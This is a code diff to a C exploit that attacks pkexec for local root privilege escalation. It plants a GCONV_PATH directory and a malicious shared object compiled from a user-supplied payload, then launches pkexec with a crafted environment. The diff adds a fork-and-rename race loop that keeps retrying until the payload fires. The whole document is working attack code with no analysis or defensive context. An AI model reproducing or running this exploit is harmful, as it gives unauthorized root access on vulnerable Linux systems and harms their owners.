@@ -1,6 +1,9 @@
+#include <fcntl.h>
+#include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/stat.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 void read_payload(char *payload_file, char **payload_contents) {
@@ -10,26 +13,26 @@ void read_payload(char *payload_file, char **payload_contents) {
 
   if (NULL == payload_contents) {
     fprintf(stderr, "[-] Can't read to NULL ptr\n");
-    goto EXIT;
+    goto exit;
   }
 
   if (0 > stat(payload_file, &payload_stats)) {
     fprintf(stderr, "[-] Failed to stat payload file\n");
     *payload_contents = NULL;
-    goto EXIT;
+    goto exit;
   }
 
   if (NULL == (pfp = fopen(payload_file, "r"))) {
     fprintf(stderr, "[-] Failed to open payload file\n");
     *payload_contents = NULL;
-    goto EXIT;
+    goto exit;
   }
 
   *payload_contents = calloc(payload_stats.st_size, sizeof(char));
   if (NULL == *payload_contents) {
     fprintf(stderr, "[-] Failed calloc for payload\n");
     *payload_contents = NULL;
-    goto EXIT;
+    goto exit;
   }
 
   bytes_read =
@@ -41,7 +44,7 @@ void read_payload(char *payload_file, char **payload_contents) {
     *payload_contents = NULL;
   }
 
-EXIT:
+exit:
   if (NULL != pfp) {
     fclose(pfp);
   }
@@ -56,11 +59,13 @@ void setup(char *payload_file) {
 
   if (NULL == pl_contents) {
     fprintf(stderr, "[-] Unable to setup exploit\n");
-    exit(-1);
+    exit(1);
   }
 
+  system("rm g2g");
+
   // GCONV_PATH setup
-  system("mkdir GCONV_PATH=.");
+  mkdir("GCONV_PATH=.", 0700);
   system("touch GCONV_PATH=./privesc");
   system("chmod a+x GCONV_PATH=./privesc");
 
@@ -77,22 +82,61 @@ void setup(char *payload_file) {
   system("gcc -o privesc/privesc.so -shared -fPIC privesc/privesc.c ");
 }
 
+void race() {
+  // keep racing while payload didnt trigger
+  for (; 0 != access("g2g", F_OK);) {
+    rename("GCONV_PATH=./privesc", "GCONV_PATH=./race");
+    rename("GCONV_PATH=./race", "GCONV_PATH=./privesc");
+  }
+}
+
 int main(int argc, char *argv[]) {
   int ret = 0;
+  pid_t pkid, rid, w = 0;
+  int wstatus = 0;
+  char *pk_path = "/usr/bin/pkexec";
 
-  if (argc != 2 || argv[1] == NULL) {
+  char *args[] = {NULL};
+  char *env[] = {"privesc", "PATH=GCONV_PATH=.", "CHARSET=PRIVESC", NULL};
+
+  if (argc < 2 || argv[1] == NULL) {
     fprintf(stderr, "[-] Need Payload C File for Malicious SO\n");
-    ret = -1;
-    goto EXIT;
+    ret = 1;
+    goto exit;
   }
 
   setup(argv[1]);
 
-  char *args[] = {NULL};
-  char *env[] = {"privesc", "PATH=GCONV_PATH=.", "CHARSET=PRIVESC", "SHELL=sh",
-                 NULL};
-  execve("/usr/bin/pkexec", args, env);
+  // start race condition setup
+  if (0 == fork()) {
+    race();
+  }
 
-EXIT:
+  // loop to keep attempting to win race
+  for (;;) {
+    // if the payload triggered stop attempting
+    if (0 == access("g2g", F_OK)) {
+      usleep(1000);
+      break;
+    }
+    // need to fork again since execve replaces the process
+    if (0 == fork()) {
+      // fork again to avoid the syslog nonauth error
+      // instead will go down the "dead parent" error path
+      if (0 == fork()) {
+        execve(pk_path, args, env);
+      } else {
+        exit(EXIT_FAILURE);
+      }
+    }
+  }
+
+  // remain open so the payload keeps running
+  // need CTRL-C after exiting payload
+  do {
+    usleep(1000);
+  } while (1);
+
+exit:
   return ret;
 }
